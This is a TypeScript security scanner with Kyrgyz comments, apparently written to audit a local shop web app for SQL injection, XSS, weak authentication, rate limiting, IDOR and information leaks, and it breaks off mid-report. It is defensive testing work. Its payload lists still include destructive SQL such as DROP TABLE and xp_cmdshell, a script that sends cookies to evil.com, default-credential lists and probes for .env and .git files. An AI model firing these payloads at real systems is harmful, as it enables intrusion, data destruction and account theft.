/**
 * 🔒 ТОЛУК КООПСУЗДУК ТЕСТИРОВЩИК
 *
 * Хакерлер сыяктуу баардык алсыздыктарды табат:
 * - SQL Injection
 * - XSS (Cross-Site Scripting)
 * - Authentication Bypass
 * - Rate Limiting
 * - Brute Force
 * - Session Hijacking
 * - IDOR (Insecure Direct Object Reference)
 * - Information Leakage
 * - Input Validation Bypass
 * - И башкалар...
 *
 * Иштетүү: npm run test:security
 */

const BASE_URL = process.env.TEST_URL || 'http://localhost:3000';

// ============================================
// ТҮСТӨР ЖАНА ЖАРДАМЧЫ ФУНКЦИЯЛАР
// ============================================

const colors = {
  reset: '\x1b[0m',
  red: '\x1b[31m',
  green: '\x1b[32m',
  yellow: '\x1b[33m',
  blue: '\x1b[34m',
  magenta: '\x1b[35m',
  cyan: '\x1b[36m',
  white: '\x1b[37m',
  bgRed: '\x1b[41m',
  bgGreen: '\x1b[42m',
  bgYellow: '\x1b[43m',
};

function log(color: keyof typeof colors, text: string) {
  console.log(`${colors[color]}${text}${colors.reset}`);
}

function logSection(title: string) {
  console.log('\n' + '═'.repeat(60));
  log('cyan', `🔍 ${title}`);
  console.log('═'.repeat(60));
}

interface Vulnerability {
  severity: 'CRITICAL' | 'HIGH' | 'MEDIUM' | 'LOW' | 'INFO';
  category: string;
  name: string;
  description: string;
  evidence?: string;
  fix: string;
}

const vulnerabilities: Vulnerability[] = [];

function addVulnerability(vuln: Vulnerability) {
  vulnerabilities.push(vuln);
  const icon = {
    CRITICAL: '🚨',
    HIGH: '🔴',
    MEDIUM: '🟠',
    LOW: '🟡',
    INFO: '🔵'
  }[vuln.severity];

  log(vuln.severity === 'CRITICAL' ? 'bgRed' : vuln.severity === 'HIGH' ? 'red' : 'yellow',
    `  ${icon} [${vuln.severity}] ${vuln.name}`);
  log('white', `     ${vuln.description}`);
  if (vuln.evidence) {
    log('magenta', `     📋 Evidence: ${vuln.evidence.slice(0, 100)}...`);
  }
}

function addPassed(name: string) {
  log('green', `  ✅ ${name} - Коопсуз`);
}

async function fetchWithTimeout(url: string, options: RequestInit = {}, timeout = 10000) {
  const controller = new AbortController();
  const id = setTimeout(() => controller.abort(), timeout);

  try {
    const response = await fetch(url, {
      ...options,
      signal: controller.signal
    });
    clearTimeout(id);
    return response;
  } catch (error) {
    clearTimeout(id);
    throw error;
  }
}

// ============================================
// 1. SQL INJECTION ТЕСТТЕРИ
// ============================================

async function testSQLInjection() {
  logSection('SQL INJECTION ТЕСТТЕРИ');

  const sqlPayloads = [
    // Классикалык SQL Injection
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR '1'='1' /*",
    "admin'--",
    "1' OR '1' = '1",
    "1; DROP TABLE users--",
    "'; DROP TABLE users;--",
    "' UNION SELECT * FROM users--",
    "' UNION SELECT username, password FROM users--",
    "1' AND '1'='1",
    "1' AND SLEEP(5)--",
    "' OR SLEEP(5)--",
    "'; WAITFOR DELAY '0:0:5'--",
    "1'; EXEC xp_cmdshell('dir')--",
    "' OR 1=1#",
    "admin' #",
    "' OR ''='",
    "' OR 'x'='x",
    "') OR ('1'='1",
    "' OR id IS NOT NULL OR 'x'='y",
  ];

  // Login SQL Injection
  for (const payload of sqlPayloads.slice(0, 5)) {
    try {
      const res = await fetchWithTimeout(`${BASE_URL}/api/auth/login`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          email: payload,
          password: payload
        })
      });

      const text = await res.text();

      // SQL ката билдирүүсү бар болсо - алсыз
      if (text.toLowerCase().includes('sql') ||
          text.toLowerCase().includes('syntax') ||
          text.toLowerCase().includes('query') ||
          text.toLowerCase().includes('postgres') ||
          text.toLowerCase().includes('mysql') ||
          text.includes('SELECT') ||
          text.includes('FROM')) {
        addVulnerability({
          severity: 'CRITICAL',
          category: 'SQL Injection',
          name: 'Login SQL Injection',
          description: 'Login формасы SQL Injection чабуулуна алсыз',
          evidence: `Payload: ${payload}, Response: ${text.slice(0, 200)}`,
          fix: 'Parameterized queries колдонуңуз. Input санитизация кылыңыз.'
        });
        break;
      }

      // Эгер 200 кайтса - authentication bypass
      if (res.status === 200 && text.includes('user')) {
        addVulnerability({
          severity: 'CRITICAL',
          category: 'SQL Injection',
          name: 'Authentication Bypass via SQL Injection',
          description: 'SQL Injection аркылуу логин кылуу мүмкүн',
          evidence: `Payload: ${payload}`,
          fix: 'Input валидация жана parameterized queries колдонуңуз'
        });
        break;
      }
    } catch (err) {}
  }
  addPassed('Login SQL Injection текшерилди');

  // Register SQL Injection
  try {
    const res = await fetchWithTimeout(`${BASE_URL}/api/auth/register`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        email: "test@test.com' OR '1'='1",
        password: "test'; DROP TABLE users;--",
        fullName: "'; DELETE FROM users;--"
      })
    });
    const text = await res.text();

    if (text.toLowerCase().includes('sql') || text.toLowerCase().includes('syntax')) {
      addVulnerability({
        severity: 'CRITICAL',
        category: 'SQL Injection',
        name: 'Register SQL Injection',
        description: 'Register формасы SQL Injection чабуулуна алсыз',
        evidence: text.slice(0, 200),
        fix: 'Бардык input\'ларды санитизация кылыңыз'
      });
    } else {
      addPassed('Register SQL Injection');
    }
  } catch (err) {}

  // Search SQL Injection
  try {
    const res = await fetchWithTimeout(`${BASE_URL}/api/products?search=' OR 1=1--`);
    const text = await res.text();

    if (text.toLowerCase().includes('sql') || text.toLowerCase().includes('error')) {
      addVulnerability({
        severity: 'HIGH',
        category: 'SQL Injection',
        name: 'Search SQL Injection',
        description: 'Издөө SQL Injection\'го алсыз',
        fix: 'Search параметрин санитизация кылыңыз'
      });
    } else {
      addPassed('Search SQL Injection');
    }
  } catch (err) {}
}

// ============================================
// 2. XSS (CROSS-SITE SCRIPTING) ТЕСТТЕРИ
// ============================================

async function testXSS() {
  logSection('XSS (CROSS-SITE SCRIPTING) ТЕСТТЕРИ');

  const xssPayloads = [
    '<script>alert("XSS")</script>',
    '<img src=x onerror=alert("XSS")>',
    '<svg onload=alert("XSS")>',
    '"><script>alert("XSS")</script>',
    "'-alert('XSS')-'",
    '<body onload=alert("XSS")>',
    '<iframe src="javascript:alert(\'XSS\')">',
    '<input onfocus=alert("XSS") autofocus>',
    '<marquee onstart=alert("XSS")>',
    '<details open ontoggle=alert("XSS")>',
    '<math><maction actiontype="statusline#http://evil.com">click</maction></math>',
    'javascript:alert("XSS")',
    '<a href="javascript:alert(\'XSS\')">click</a>',
    '<div style="background:url(javascript:alert(\'XSS\'))">',
    '{{constructor.constructor("alert(1)")()}}',
    '${alert("XSS")}',
    '<script>fetch("http://evil.com?cookie="+document.cookie)</script>',
  ];

  // Register XSS
  for (const payload of xssPayloads.slice(0, 5)) {
    try {
      const res = await fetchWithTimeout(`${BASE_URL}/api/auth/register`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          email: 'xsstest@test.com',
          password: 'TestPass123!',
          fullName: payload
        })
      });
      const text = await res.text();

      // XSS payload сакталып калса
      if (text.includes(payload) && !text.includes('&lt;') && !text.includes('\\u003c')) {
        addVulnerability({
          severity: 'HIGH',
          category: 'XSS',
          name: 'Stored XSS in fullName',
          description: 'Аты-жөнү талаасы XSS чабуулуна алсыз',
          evidence: payload,
          fix: 'Бардык чыгарылган маалыматты HTML escape кылыңыз'
        });
        break;
      }
    } catch (err) {}
  }
  addPassed('Register XSS текшерилди');

  // Search XSS (Reflected)
  try {
    const payload = '<script>alert(1)</script>';
    const res = await fetchWithTimeout(`${BASE_URL}/api/products?search=${encodeURIComponent(payload)}`);
    const text = await res.text();

    if (text.includes(payload) && !text.includes('&lt;')) {
      addVulnerability({
        severity: 'HIGH',
        category: 'XSS',
        name: 'Reflected XSS in Search',
        description: 'Издөө параметри XSS чабуулуна алсыз',
        fix: 'Search параметрин HTML escape кылыңыз'
      });
    } else {
      addPassed('Search Reflected XSS');
    }
  } catch (err) {}

  // Review XSS
  try {
    const res = await fetchWithTimeout(`${BASE_URL}/api/reviews`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        productId: 'test',
        rating: 5,
        comment: '<script>alert("XSS")</script>'
      })
    });
    const text = await res.text();

    if (text.includes('<script>') && !text.includes('&lt;')) {
      addVulnerability({
        severity: 'HIGH',
        category: 'XSS',
        name: 'Stored XSS in Reviews',
        description: 'Сын-пикир талаасы XSS чабуулуна алсыз',
        fix: 'Сын-пикирлерди санитизация кылыңыз'
      });
    } else {
      addPassed('Review XSS');
    }
  } catch (err) {}
}

// ============================================
// 3. AUTHENTICATION ТЕСТТЕРИ
// ============================================

async function testAuthentication() {
  logSection('AUTHENTICATION ТЕСТТЕРИ');

  // Бош credentials
  try {
    const res = await fetchWithTimeout(`${BASE_URL}/api/auth/login`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ email: '', password: '' })
    });

    if (res.status === 200) {
      addVulnerability({
        severity: 'CRITICAL',
        category: 'Authentication',
        name: 'Empty Credentials Login',
        description: 'Бош credentials менен кирүү мүмкүн',
        fix: 'Бош email/password четке кагыңыз'
      });
    } else {
      addPassed('Empty Credentials текшерүү');
    }
  } catch (err) {}

  // Default credentials
  const defaultCreds = [
    { email: 'admin@admin.com', password: 'admin' },
    { email: 'admin@admin.com', password: 'admin123' },
    { email: 'admin@admin.com', password: 'password' },
    { email: 'admin@admin.com', password: '123456' },
    { email: 'test@test.com', password: 'test' },
    { email: 'root@root.com', password: 'root' },
    { email: 'admin@pinduo.kg', password: 'admin' },
  ];

  for (const cred of defaultCreds) {
    try {
      const res = await fetchWithTimeout(`${BASE_URL}/api/auth/login`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(cred)
      });

      if (res.status === 200) {
        addVulnerability({
          severity: 'CRITICAL',
          category: 'Authentication',
          name: 'Default Credentials',
          description: `Default credentials иштейт: ${cred.email}`,
          fix: 'Default аккаунттарды өчүрүңүз же сырсөздөрүн өзгөртүңүз'
        });
        break;
      }
    } catch (err) {}
  }
  addPassed('Default credentials текшерилди');

  // Password Strength
  const weakPasswords = ['123456', 'password', 'qwerty', 'abc123', '111111', 'admin', 'test'];

  for (const weakPass of weakPasswords) {
    try {
      const res = await fetchWithTimeout(`${BASE_URL}/api/auth/register`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          email: `weakpass_${Date.now()}@test.com`,
          password: weakPass,
          fullName: 'Test'
        })
      });

      if (res.status === 200 || res.status === 201) {
        addVulnerability({
          severity: 'MEDIUM',
          category: 'Authentication',
          name: 'Weak Password Accepted',
          description: `Алсыз сырсөз кабыл алынды: "${weakPass}"`,
          fix: 'Сырсөз күчүн текшерүүнү кошуңуз (мин. 8 символ, чоң/кичине тамга, сан)'
        });
        break;
      }
    } catch (err) {}
  }
  addPassed('Password strength текшерилди');

  // User enumeration
  try {
    const existingRes = await fetchWithTimeout(`${BASE_URL}/api/auth/login`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ email: 'admin@admin.com', password: 'wrongpassword' })
    });
    const existingText = await existingRes.text();

    const nonExistingRes = await fetchWithTimeout(`${BASE_URL}/api/auth/login`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ email: 'nonexistent12345@test.com', password: 'wrongpassword' })
    });
    const nonExistingText = await nonExistingRes.text();

    // Эгер ката билдирүүлөрү башка болсо - user enumeration алсыздыгы
    if (existingText !== nonExistingText &&
        (existingText.includes('пароль') || nonExistingText.includes('табылган жок') ||
         existingText.includes('password') || nonExistingText.includes('not found'))) {
      addVulnerability({
        severity: 'MEDIUM',
        category: 'Authentication',
        name: 'User Enumeration',
        description: 'Колдонуучу бар/жок экенин аныктоо мүмкүн',
        evidence: `Existing: "${existingText.slice(0,100)}", Non-existing: "${nonExistingText.slice(0,100)}"`,
        fix: 'Бирдей ката билдирүү колдонуңуз: "Email же сырсөз туура эмес"'
      });
    } else {
      addPassed('User enumeration коргоосу');
    }
  } catch (err) {}

  // JWT/Session тесттери
  try {
    // Жасалма token менен кирүү
    const res = await fetchWithTimeout(`${BASE_URL}/api/orders`, {
      headers: {
        'Authorization': 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOiIxIiwiZW1haWwiOiJhZG1pbkBhZG1pbi5jb20iLCJyb2xlIjoiYWRtaW4ifQ.fake'
      }
    });

    if (res.status === 200) {
      addVulnerability({
        severity: 'CRITICAL',
        category: 'Authentication',
        name: 'JWT Bypass',
        description: 'Жасалма JWT token кабыл алынды',
        fix: 'JWT signature текшерүүнү кошуңуз'
      });
    } else {
      addPassed('JWT validation');
    }
  } catch (err) {}
}

// ============================================
// 4. RATE LIMITING ТЕСТТЕРИ
// ============================================

async function testRateLimiting() {
  logSection('RATE LIMITING / BRUTE FORCE ТЕСТТЕРИ');

  // Login brute force
  let blocked = false;
  const attempts = 20;

  for (let i = 0; i < attempts; i++) {
    try {
      const res = await fetchWithTimeout(`${BASE_URL}/api/auth/login`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          email: 'bruteforce@test.com',
          password: `wrong_${i}`
        })
      });

      if (res.status === 429) {
        blocked = true;
        addPassed(`Login rate limiting (${i + 1} аракеттен кийин блоктолду)`);
        break;
      }
    } catch (err) {}
  }

  if (!blocked) {
    addVulnerability({
      severity: 'HIGH',
      category: 'Rate Limiting',
      name: 'No Login Rate Limiting',
      description: `${attempts} аракеттен кийин да блоктолгон жок - Brute Force мүмкүн`,
      fix: 'Rate limiting кошуңуз: 5 аракет / 15 мүнөт'
    });
  }

  // OTP brute force
  blocked = false;
  for (let i = 0; i < 15; i++) {
    try {
      const res = await fetchWithTimeout(`${BASE_URL}/api/auth/verify-otp`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          phone: '+996700111222',
          code: String(100000 + i).slice(-6)
        })
      });

      if (res.status === 429) {
        blocked = true;
        addPassed(`OTP rate limiting (${i + 1} аракеттен кийин)`);
        break;
      }
    } catch (err) {}
  }

  if (!blocked) {
    addVulnerability({
      severity: 'HIGH',
      category: 'Rate Limiting',
      name: 'OTP Brute Force Possible',
      description: 'OTP кодду brute force кылуу мүмкүн',
      fix: 'OTP текшерүүгө rate limiting кошуңуз: 3-5 аракет'
    });
  }

  // SMS спам
  blocked = false;
  for (let i = 0; i < 10; i++) {
    try {
      const res = await fetchWithTimeout(`${BASE_URL}/api/auth/send-otp`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ phone: '+996700999888' })
      });

      if (res.status === 429) {
        blocked = true;
        addPassed(`SMS rate limiting (${i + 1} жөнөтүүдөн кийин)`);
        break;
      }
    } catch (err) {}
  }

  if (!blocked) {
    addVulnerability({
      severity: 'MEDIUM',
      category: 'Rate Limiting',
      name: 'SMS Spam Possible',
      description: 'SMS спам жасоо мүмкүн',
      fix: 'SMS жөнөтүүгө rate limiting кошуңуз: 3 SMS / 10 мүнөт'
    });
  }

  // Register rate limiting
  blocked = false;
  for (let i = 0; i < 10; i++) {
    try {
      const res = await fetchWithTimeout(`${BASE_URL}/api/auth/register`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          email: `spam_${Date.now()}_${i}@test.com`,
          password: 'TestPass123!',
          fullName: 'Spammer'
        })
      });

      if (res.status === 429) {
        blocked = true;
        addPassed(`Register rate limiting (${i + 1} аракет)`);
        break;
      }
    } catch (err) {}
  }

  if (!blocked) {
    addVulnerability({
      severity: 'MEDIUM',
      category: 'Rate Limiting',
      name: 'Mass Registration Possible',
      description: 'Көп аккаунт түзүү мүмкүн (спам)',
      fix: 'Register\'ге rate limiting: 3 аккаунт / саат / IP'
    });
  }
}

// ============================================
// 5. IDOR (INSECURE DIRECT OBJECT REFERENCE)
// ============================================

async function testIDOR() {
  logSection('IDOR / AUTHORIZATION ТЕСТТЕРИ');

  // Башка колдонуучунун заказдарын көрүү
  const userIds = ['1', '2', 'admin', '00000000-0000-0000-0000-000000000001'];

  for (const userId of userIds) {
    try {
      const res = await fetchWithTimeout(`${BASE_URL}/api/orders?userId=${userId}`);
      const data = await res.json();

      if (res.status === 200 && Array.isArray(data) && data.length > 0) {
        addVulnerability({
          severity: 'HIGH',
          category: 'IDOR',
          name: 'Order Data Exposure',
          description: 'Башка колдонуучулардын заказдарын көрүү мүмкүн',
          evidence: `userId=${userId}`,
          fix: 'Authorization текшерүү кошуңуз - өз заказдарын гана көрсүн'
        });
        break;
      }
    } catch (err) {}
  }
  addPassed('Orders IDOR');

  // Башка колдонуучунун профилин өзгөртүү
  try {
    const res = await fetchWithTimeout(`${BASE_URL}/api/users/1`, {
      method: 'PUT',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ role: 'admin', coins: 999999 })
    });

    if (res.status === 200) {
      addVulnerability({
        severity: 'CRITICAL',
        category: 'IDOR',
        name: 'Profile Manipulation',
        description: 'Башка колдонуучунун профилин өзгөртүү мүмкүн',
        fix: 'Authorization текшерүү кошуңуз'
      });
    } else {
      addPassed('Profile IDOR');
    }
  } catch (err) {}

  // Admin endpoint'терге кирүү
  const adminEndpoints = [
    '/api/admin/users',
    '/api/admin/orders',
    '/api/admin/stats',
    '/admin',
    '/api/seller/stats',
  ];

  for (const endpoint of adminEndpoints) {
    try {
      // Redirect'ти көзөмөлдөө үчүн redirect: 'manual'
      const res = await fetchWithTimeout(`${BASE_URL}${endpoint}`, {
        redirect: 'manual'
      });

      // Redirect болсо - корголгон
      if (res.status === 307 || res.status === 302 || res.status === 301) {
        const location = res.headers.get('location');
        if (location?.includes('login') || location?.includes('auth')) {
          addPassed(`Admin endpoint корголгон: ${endpoint} → login`);
          continue;
        }
      }

      // 401/403 болсо - корголгон
      if (res.status === 401 || res.status === 403) {
        addPassed(`Admin endpoint корголгон: ${endpoint} (${res.status})`);
        continue;
      }

      // 200 болсо жана маалымат бар - алсыз
      if (res.status === 200) {
        const text = await res.text();
        if (text.includes('admin') && (text.includes('users') || text.includes('orders') || text.includes('dashboard'))) {
          addVulnerability({
            severity: 'CRITICAL',
            category: 'Authorization',
            name: 'Admin Endpoint Exposed',
            description: `Admin endpoint ачык: ${endpoint}`,
            fix: 'Admin endpoint\'терге authentication кошуңуз'
          });
        }
      }
    } catch (err) {}
  }
}

// ============================================
// 6. INFORMATION LEAKAGE
// ============================================

async function testInformationLeakage() {
  logSection('INFORMATION LEAKAGE ТЕСТТЕРИ');

  // Error messages
  try {
    const res = await fetchWithTimeout(`${BASE_URL}/api/auth/login`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: 'invalid json'
    });
    const text = await res.text();

    if (text.includes('stack') || text.includes('at ') ||
        text.includes('node_modules') || text.includes('.ts:') ||
        text.includes('Error:') && text.includes('line')) {
      addVulnerability({
        severity: 'MEDIUM',
        category: 'Information Leakage',
        name: 'Stack Trace Exposure',
        description: 'Ката учурунда stack trace көрүнөт',
        evidence: text.slice(0, 200),
        fix: 'Production\'до деталдуу каталарды көрсөтпөңүз'
      });
    } else {
      addPassed('Stack trace коргоосу');
    }
  } catch (err) {}

  // Sensitive files
  const sensitiveFiles = [
    '/.env',
    '/.env.local',
    '/config.json',
    '/.git/config',
    '/package.json',
    '/tsconfig.json',
    '/.next/server/pages-manifest.json',
    '/api/.env',
  ];

  for (const file of sensitiveFiles) {
    try {
      const res = await fetchWithTimeout(`${BASE_URL}${file}`);

      if (res.status === 200) {
        const text = await res.text();
        if (text.includes('SUPABASE') || text.includes('API_KEY') ||
            text.includes('SECRET') || text.includes('PASSWORD') ||
            text.includes('database')) {
          addVulnerability({
            severity: 'CRITICAL',
            category: 'Information Leakage',
            name: 'Sensitive File Exposure',
            description: `Купуя файл ачык: ${file}`,
            fix: 'Бул файлды public\'ден алып салыңыз'
          });
        }
      }
    } catch (err) {}
  }
  addPassed('Sensitive files');

  // API response'до ашыкча маалымат
  try {
    const res = await fetchWithTimeout(`${BASE_URL}/api/products`);
    const data = await res.json();

    if (Array.isArray(data) && data.length > 0) {
      const product = data[0];
      if (product.cost_price || product.supplier || product.internal_notes) {
        addVulnerability({
          severity: 'MEDIUM',
          category: 'Information Leakage',
          name: 'Sensitive Product Data',
          description: 'Продукт маалыматында ички маалымат бар',
          fix: 'API response\'до керектүү талааларды гана кайтарыңыз'
        });
      }
    }
  } catch (err) {}
  addPassed('Product data');

  // Headers
  try {
    const res = await fetchWithTimeout(`${BASE_URL}/`);
    const serverHeader = res.headers.get('server');
    const poweredBy = res.headers.get('x-powered-by');

    if (serverHeader || poweredBy) {
      addVulnerability({
        severity: 'LOW',
        category: 'Information Leakage',
        name: 'Server Version Disclosure',
        description: `Сервер версиясы ачык: ${serverHeader || poweredBy}`,
        fix: 'Server жана X-Powered-By header\'лерин алып салыңыз'
      });
    } else {
      addPassed('Server header');
    }
  } catch (err) {}
}

// ============================================
// 7. INPUT VALIDATION
// ============================================

async function testInputValidation() {
  logSection('INPUT VALIDATION ТЕСТТЕРИ');

  // Email validation
  const invalidEmails = [
    'notanemail',
    '@nouser.com',
    'user@',
    'user@.com',
    'user@domain',
    'user name@domain.com',
    '<script>@evil.com',
  ];

  for (const email of invalidEmails) {
    try {
      const res = await fetchWithTimeout(`${BASE_URL}/api/auth/register`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          email,
          password: 'TestPass123!',
          fullName: 'Test'
        })
      });

      if (res.status === 200 || res.status === 201) {
        addVulnerability({
          severity: 'LOW',
          category: 'Input Validation',
          name: 'Invalid Email Accepted',
          description: `Туура эмес email кабыл алынды: ${email}`,
          fix: 'Email regex валидация кошуңуз'
        });
        break;
      }
    } catch (err) {}
  }
  addPassed('Email validation');

  // Phone validation
  const invalidPhones = [
    '123',
    'notaphone',
    '+1234567890123456789',
    '<script>alert(1)</script>',
  ];

  for (const phone of invalidPhones) {
    try {
      const res = await fetchWithTimeout(`${BASE_URL}/api/auth/send-otp`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ phone })
      });

      if (res.status === 200) {
        addVulnerability({
          severity: 'MEDIUM',
          category: 'Input Validation',
          name: 'Invalid Phone Accepted',
          description: `Туура эмес телефон кабыл алынды: ${phone}`,
          fix: 'Phone валидация кошуңуз (+996 формат)'
        });
        break;
      }
    } catch (err) {}
  }
  addPassed('Phone validation');

  // Large payload
  try {
    const largePayload = 'A'.repeat(1000000); // 1MB
    const res = await fetchWithTimeout(`${BASE_URL}/api/auth/register`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        email: 'test@test.com',
        password: 'TestPass123!',
        fullName: largePayload
      })
    }, 5000);

    if (res.status === 200 || res.status === 201) {
      addVulnerability({
        severity: 'MEDIUM',
        category: 'Input Validation',
        name: 'Large Payload Accepted',
        description: 'Өтө чоң маалымат кабыл алынды (DoS мүмкүн)',
        fix: 'Талаа узундугун чектеңиз (мис. fullName max 100 символ)'
      });
    }
  } catch (err) {
    addPassed('Large payload коргоосу');
  }
}

// ============================================
// 8. SECURITY HEADERS
// ============================================

async function testSecurityHeaders() {
  logSection('SECURITY HEADERS ТЕСТТЕРИ');

  try {
    const res = await fetchWithTimeout(`${BASE_URL}/`);
    const headers = res.headers;

    // X-Content-Type-Options
    if (headers.get('x-content-type-options') !== 'nosniff') {
      addVulnerability({
        severity: 'LOW',
        category: 'Security Headers',
        name: 'Missing X-Content-Type-Options',
        description: 'X-Content-Type-Options header жок',
        fix: "Headers'го кошуңуз: 'X-Content-Type-Options': 'nosniff'"
      });
    } else {
      addPassed('X-Content-Type-Options');
    }

    // X-Frame-Options
    const xfo = headers.get('x-frame-options');
    if (!xfo || (xfo !== 'DENY' && xfo !== 'SAMEORIGIN')) {
      addVulnerability({
        severity: 'MEDIUM',
        category: 'Security Headers',
        name: 'Missing X-Frame-Options',
        description: 'Clickjacking чабуулуна алсыз',
        fix: "Headers'го кошуңуз: 'X-Frame-Options': 'DENY'"
      });
    } else {
      addPassed('X-Frame-Options');
    }

    // X-XSS-Protection
    if (!headers.get('x-xss-protection')) {
      addVulnerability({
        severity: 'LOW',
        category: 'Security Headers',
        name: 'Missing X-XSS-Protection',
        description: 'X-XSS-Protection header жок',
        fix: "Headers'го кошуңуз: 'X-XSS-Protection': '1; mode=block'"
      });
    } else {
      addPassed('X-XSS-Protection');
    }

    // Content-Security-Policy
    if (!headers.get('content-security-policy')) {
      addVulnerability({
        severity: 'MEDIUM',
        category: 'Security Headers',
        name: 'Missing Content-Security-Policy',
        description: 'CSP header жок - XSS чабуулдары оңой',
        fix: 'Content-Security-Policy header кошуңуз'
      });
    } else {
      addPassed('Content-Security-Policy');
    }

    // Strict-Transport-Security (HTTPS)
    if (!headers.get('strict-transport-security')) {
      addVulnerability({
        severity: 'INFO',
        category: 'Security Headers',
        name: 'Missing HSTS',
        description: 'HSTS header жок (production үчүн керек)',
        fix: "HTTPS колдонсоңуз: 'Strict-Transport-Security': 'max-age=31536000'"
      });
    } else {
      addPassed('HSTS');
    }

  } catch (err) {}
}

// ============================================
// 9. API SECURITY
// ============================================

async function testAPISecurity() {
  logSection('API SECURITY ТЕСТТЕРИ');

  // HTTP Methods
  const methods = ['PUT', 'DELETE', 'PATCH', 'OPTIONS', 'TRACE'];

  for (const method of methods) {
    try {
      const res = await fetchWithTimeout(`${BASE_URL}/api/auth/login`, {
        method
      });

      if (res.status === 200 && method === 'TRACE') {
        addVulnerability({
          severity: 'MEDIUM',
          category: 'API Security',
          name: 'TRACE Method Enabled',
          description: 'TRACE method иштейт - XST чабуулу мүмкүн',
          fix: 'TRACE method\'ду өчүрүңүз'
        });
      }
    } catch (err) {}
  }
  addPassed('HTTP Methods');

  // CORS
  try {
    const res = await fetchWithTimeout(`${BASE_URL}/api/products`, {
      headers: {
        'Origin': 'http://evil-site.com'
      }
    });

    const allowOrigin = res.headers.get('access-control-allow-origin');
    if (allowOrigin === '*') {
      addVulnerability({
        severity: 'MEDIUM',
        category: 'API Security',
        name: 'CORS Wildcard',
        description: 'CORS баарына ачык (*)',
        fix: 'Конкреттүү домендерди гана уруксат бериңиз'
      });
    } else {
      addPassed('CORS');
    }
  } catch (err) {}

  // Mass assignment
  try {
    const res = await fetchWithTimeout(`${BASE_URL}/api/auth/register`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        email: `massassign_${Date.now()}@test.com`,
        password: 'TestPass123!',
        fullName: 'Test',
        role: 'admin',
        is_verified: true,
        coins: 999999
      })
    });

    if (res.status === 200 || res.status === 201) {
      const data = await res.json();
      if (data.user?.role === 'admin' || data.user?.coins === 999999) {
        addVulnerability({
          severity: 'CRITICAL',
          category: 'API Security',
          name: 'Mass Assignment',
          description: 'Кошумча талааларды өзгөртүү мүмкүн (role, coins)',
          fix: 'Кабыл алынуучу талааларды так аныктаңыз (whitelist)'
        });
      }
    }
  } catch (err) {}
  addPassed('Mass assignment');
}

// ============================================
// НЕГИЗГИ ФУНКЦИЯ
// ============================================

async function runSecurityTests() {
  console.log('\n');
  console.log('╔══════════════════════════════════════════════════════════╗');
  console.log('║     🔒 ТОЛУК КООПСУЗДУК ТЕСТИРОВЩИК - Pinduo Shop        ║');
  console.log('║         Хакерлер сыяктуу баарын текшерет                 ║');
  console.log('╚══════════════════════════════════════════════════════════╝');
  log('blue', `\n📍 Target: ${BASE_URL}`);
  log('blue', `⏰ Убакыт: ${new Date().toLocaleString()}\n`);

  // Сервер текшерүү
  try {
    await fetchWithTimeout(`${BASE_URL}`, {}, 5000);
    log('green', '✅ Сервер иштеп жатат\n');
  } catch (err) {
    log('red', '❌ СЕРВЕР ИШТЕБЕЙТ!');
    log('yellow', '💡 npm run dev командасын иштетип, кайра аракет кылыңыз\n');
    return;
  }

  // Баардык тесттер
  await testSQLInjection();
  await testXSS();
  await testAuthentication();
  await testRateLimiting();
  await testIDOR();
  await testInformationLeakage();
  await testInputValidation();
  await testSecurityHeaders();
  await testAPISecurity();

  // ============================================
  // ЖЫЙЫНТЫК ОТЧЕТ
  // ============================================

  console.log('\n');
  console.log('╔══════════════════════════════════════════════════════════╗');
  console.log('║                    📊 ЖЫЙЫНТЫК ОТЧЕТ                      ║');
  console.log('╚══════════════════════════════════════════════════════════╝');

  const critical = vulnerabilities.filter(v => v.severity === 'CRITICAL');
  const high = vulnerabilities.filter(v => v.severity === 'HIGH');
  const medium = vulnerabilities.filter(v => v.severity === 'MEDIUM');
  const low = vulnerabilities.filter(v => v.severity === 'LOW');
  const info = vulnerabilities.filter(v => v.severity === 'INFO');

  console.log('\n📈 Статистика:');
  log('red', `   🚨 CRITICAL: ${critical.length}`);
  log('red', `   🔴 HIGH: ${high.length}`);
  log('yellow', `   🟠 MEDIUM: ${medium.length}`);
  log('yellow', `   🟡 LOW: ${low.length}`);
  log('blue', `   🔵 INFO: ${info.length}`);
  console.log(`   ═══════════════════`);
  console.log(`   📋 ЖАЛПЫ: ${vulnerabilities.length} алсыздык\n`);

  if (critical.length > 0) {
    log('bgRed', '\n🚨 КРИТИКАЛЫК АЛСЫЗДЫКТАР (ДАРОО ОҢДОҢУЗ!):');
    critical.forEach((v, i) => {
      console.log(`\n   ${i + 1}. ${v.name}`);
      console.log(`      📝 ${v.description}`);
      log('cyan', `      💡 Оңдоо: ${v.fix}`);
    });
  }

  if (high.length > 0) {
    log('red', '\n🔴 ЖОГОРКУ ПРИОРИТЕТ:');
    high.forEach((v, i) => {
      console.log(`\n   ${i + 1}. ${v.name}`);
      console.log(`      📝 ${v.description}`);
